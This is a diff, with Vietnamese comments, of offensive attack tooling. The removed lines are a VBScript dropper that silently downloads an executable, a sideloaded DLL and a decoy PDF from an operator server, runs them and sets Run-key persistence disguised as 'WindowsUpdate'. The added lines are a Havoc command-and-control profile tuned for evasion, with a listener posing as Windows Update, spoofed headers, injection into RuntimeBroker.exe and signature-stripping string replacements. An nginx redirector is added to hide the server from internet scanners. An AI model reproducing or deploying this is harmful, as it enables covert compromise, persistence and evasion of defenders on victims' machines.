@@ -1,23 +1,128 @@
-Set WshShell = CreateObject("WScript.Shell")
-strTemp = WshShell.ExpandEnvironmentStrings("%TEMP%")
+# --- Cấu hình Teamserver ---
+# Thay đổi Port quản trị để tránh bị quét bởi Shodan/Censys
+Teamserver {
+    Host = "0.0.0.0"
+    Port = 39482 # Port quản trị mới (Đừng quên mở port này trên Firewall cho IP của bạn)
 
-' Thay IP_VPS của bạn vào đây
-vps = "http://IP_CUA_BAN/"
+    Build {
+        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
+        Nasm       = "/usr/bin/nasm"
+    }
+}
 
-' Giải thích các điểm mới:
-' 1. Unblock-File: Để Windows cho phép load DLL từ internet.
-' 2. -WorkingDirectory: Ép EXE phải tìm DLL ngay tại thư mục Temp.
-' 3. Dùng dấu nháy đơn và kép cẩn thận để PowerShell hiểu đúng đường dẫn.
+# --- Người điều hành ---
+Operators {
+    user "elit3t" {
+        Password = "roG9htDl7LlcTgiED2Mt" # Khuyên bạn nên đổi mật khẩu này định kỳ
+    }
+}
 
-psCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
-"""$t=$env:TEMP; " & _
-"iwr '" & vps & "app.exe' -OutF '$t\app.exe'; " & _
-"iwr '" & vps & "vinh.dll' -OutF '$t\vinh.dll'; " & _
-"iwr '" & vps & "decoy.pdf' -OutF '$t\decoy.pdf'; " & _
-"Unblock-File -Path '$t\app.exe'; Unblock-File -Path '$t\vinh.dll'; " & _
-"Start-Process '$t\decoy.pdf'; " & _
-"Start-Process -FilePath '$t\app.exe' -WorkingDirectory '$t'; " & _
-"New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value '$t\app.exe' -PropertyType 'String' -Force"""
+# --- Listener (Mặt tiền mạng) ---
+Listeners {
+    Http {
+        Name         = "Windows_Update_Service" # Tên giả lập
+        Hosts        = [ "net.mytotobanservice.info" ]
+        HostBind     = "0.0.0.0"
+        HostRotation = "round-robin"
+        PortBind     = 8443
+        PortConn     = 443 # Nạn nhân sẽ kết nối qua 443 (HTTPS chuẩn)
+        
+        # SỬA USER AGENT: Dùng bản Chrome mới nhất trên Windows 11
+        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
+        
+        # XÓA BỎ X-Havoc: Chỉ dùng các Header hợp lệ của Microsoft/Google
+        Headers = [
+            "Accept: application/json, text/javascript, */*; q=0.01",
+            "Accept-Language: en-US,en;q=0.9",
+            "Cache-Control: no-cache",
+            "Connection: keep-alive"
+        ]
 
-' Chạy ngầm hoàn toàn
-WshShell.Run psCmd, 0, False
+        # SỬA URIS: Giả dạng các đường dẫn tải bản cập nhật hoặc telemetry
+        Uris = [
+            "/msdownload/update/v3/static/trustedr/en/authrootstl.cab",
+            "/v1/objects/telemetry/collect",
+            "/p/v1/win/updates/check.json",
+            "/data/logging/v2/config"
+        ]
+
+        Secure = true
+        Cert {
+            # Luôn trỏ tới chứng chỉ SSL thật (Let's Encrypt)
+            Cert = "/source/Havoc/fullchain.pem"
+            Key  = "/source/Havoc/privkey.pem"
+        }
+
+        # SỬA RESPONSE: Giấu danh tính Server Havoc
+        Response {
+            Headers = [
+                "Server: Microsoft-IIS/10.0", # Giả lập là IIS Server của Windows
+                "Content-Type: application/json; charset=utf-8",
+                "X-Content-Type-Options: nosniff",
+                "X-Frame-Options: SAMEORIGIN",
+                "Access-Control-Allow-Origin: *"
+            ]
+        }
+    }
+}
+
+# --- Demon (Hành vi của Agent trên máy nạn nhân) ---
+Demon {
+    Sleep  = 45  # Thời gian chờ
+    Jitter = 40  # Độ lệch thời gian cực kỳ quan trọng để né phát hiện hành vi (Beaconing)
+
+    TrustXForwardedFor = true # Phải bật là True nếu bạn dùng Nginx làm Redirector phía trước
+
+    # GIẢ DẠNG TIẾN TRÌNH: Tránh các tiến trình đáng ngờ
+    Injection {
+        # Sử dụng Runtime Broker hoặc Mobsync (ít bị soi hơn gpresult)
+        Spawn64 = "C:\\Windows\\System32\\RuntimeBroker.exe"
+        Spawn32 = "C:\\Windows\\System32\\RuntimeBroker.exe"
+    }
+
+    # XÓA SIGNATURE TĨNH: Thay đổi các chuỗi đặc trưng trong file binary
+    Binary {
+        ReplaceStrings-x64 = {
+            "demon.x64.dll": "wsock32.dll", # Giả dạng tên DLL hệ thống
+            "Havoc": "Microsoft",           # Thay từ khóa Havoc bằng Microsoft
+            "This program cannot be run in DOS mode.": "System error. Try again.",
+        }
+    }
+}
+
+# --- Dịch vụ bổ sung ---
+Service {
+    Endpoint = "127.0.0.1:40056"
+    Password = "service-password-strong"
+}
+
+
+
+
+
+
+# Cấu hình Nginx để chặn máy quét
+server {
+    listen 443 ssl http2;
+    server_name net.mytotobanservice.info;
+
+    ssl_certificate /source/Havoc/fullchain.pem;
+    ssl_certificate_key /source/Havoc/privkey.pem;
+
+    location / {
+        # CHỈ cho phép Agent của bạn (kiểm tra qua User-Agent)
+        if ($http_user_agent != "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36") {
+            return 404; # Máy quét Shodan/Censys sẽ nhận lỗi 404 và bỏ qua
+        }
+
+        proxy_pass https://127.0.0.1:8443; # Đẩy về Havoc thật đang chạy local
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        
+        # Đảm bảo không header lạ nào lọt ra ngoài
+        proxy_hide_header X-Havoc; 
+        proxy_hide_header X-IsHavocFramework;
+    }
+}
+
